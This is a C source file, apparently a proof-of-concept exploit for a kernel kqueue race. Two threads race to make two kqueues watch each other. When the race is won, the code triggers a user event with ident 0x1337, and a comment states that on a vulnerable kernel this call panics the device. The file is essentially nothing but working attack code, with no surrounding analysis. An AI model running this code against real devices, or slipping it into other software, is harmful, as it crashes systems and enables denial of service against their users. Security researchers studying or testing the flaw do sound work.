#include "KqueueRace.h"

#include <sys/event.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <unistd.h>
#include <errno.h>

static atomic_int stop_threads;
static atomic_uint phase;
static atomic_uint done_count;
static int kqa, kqb;
static int result_a, result_b;

static void *
kq_race_worker(void *arg)
{
    int which = (int)(intptr_t)arg;
    unsigned int seen = 0;
    for (;;) {
        struct kevent change;
        while (atomic_load_explicit(&phase, memory_order_acquire) == seen) {
            sched_yield();
        }
        seen = atomic_load_explicit(&phase, memory_order_relaxed);
        if (atomic_load_explicit(&stop_threads, memory_order_relaxed)) {
            break;
        }
        if (which == 0) {
            EV_SET(&change, kqb, EVFILT_READ, EV_ADD, 0, 0, NULL);
            result_a = kevent(kqa, &change, 1, NULL, 0, NULL);
        } else {
            EV_SET(&change, kqa, EVFILT_READ, EV_ADD, 0, 0, NULL);
            result_b = kevent(kqb, &change, 1, NULL, 0, NULL);
        }
        atomic_fetch_add_explicit(&done_count, 1, memory_order_release);
    }
    return NULL;
}

kq_race_result_t
kq_race_run(long limit)
{
    kq_race_result_t out = {0};
    pthread_t threads[2];
    long i;
    
    atomic_store(&stop_threads, 0);
    atomic_store(&phase, 0);
    
    pthread_create(&threads[0], NULL, kq_race_worker, (void *)(intptr_t)0);
    pthread_create(&threads[1], NULL, kq_race_worker, (void *)(intptr_t)1);
    
    for (i = 0; i < limit; i++) {
        kqa = kqueue();
        kqb = kqueue();
        if (kqa < 0 || kqb < 0) {
            out.won = -1;
            break;
        }
        result_a = result_b = -2;
        atomic_store_explicit(&done_count, 0, memory_order_relaxed);
        atomic_fetch_add_explicit(&phase, 1, memory_order_release);
        while (atomic_load_explicit(&done_count, memory_order_acquire) != 2) {
            sched_yield();
        }
        if (result_a == 0 && result_b == 0) {
            out.won = 1;
            out.kqa = kqa;
            out.kqb = kqb;
            break;
        }
        close(kqa);
        close(kqb);
    }
    out.iterations = i;
    
    atomic_store(&stop_threads, 1);
    atomic_fetch_add_explicit(&phase, 1, memory_order_release);
    pthread_join(threads[0], NULL);
    pthread_join(threads[1], NULL);
    
    if (out.won != 1) {
        return out;
    }
    
    struct kevent user, trigger;
    EV_SET(&user, 0x1337, EVFILT_USER, EV_ADD | EV_CLEAR, 0, 0, NULL);
    if (kevent(out.kqa, &user, 1, NULL, 0, NULL) != 0) {
        out.trigger_result = -1;
        out.trigger_errno = errno;
        return out;
    }
    EV_SET(&trigger, 0x1337, EVFILT_USER, 0, NOTE_TRIGGER, 0, NULL);
    /* On a vulnerable kernel this call panics the device and never returns. */
    out.trigger_result = kevent(out.kqa, &trigger, 1, NULL, 0, NULL);
    out.trigger_errno = errno;
    return out;
}
